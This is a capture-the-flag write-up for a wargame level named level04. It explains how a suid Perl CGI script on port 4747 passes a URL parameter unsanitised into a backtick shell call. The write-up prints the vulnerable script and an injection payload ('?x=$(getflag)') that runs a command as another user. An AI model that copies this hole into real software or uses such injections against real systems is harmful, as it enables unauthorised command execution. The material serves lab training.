## level04 writeup

When logging in as user level04, we see a perl script with the suid flag. Which means when this script is executed its going to be executed as the owner, who is flag04.
We want to see what's in this perl file.
```shell
$ ls -l
...
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
...
$ cat level04.pl
```
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
We see this script might run on the 4747 port. So we can check in our browser. \
Indeed we have an apache server serving this file on this port. The script loads an `x` param from the url. \
Also the `print` function calls `echo` with the `x` parameter value. As we said before, the script will be executed as flag04. \
With this, we can execute whatever command we want by using a subshell. \
So we can do `http://VM_IP:4747?x=$(getflag)` and the flag is printed on the page.
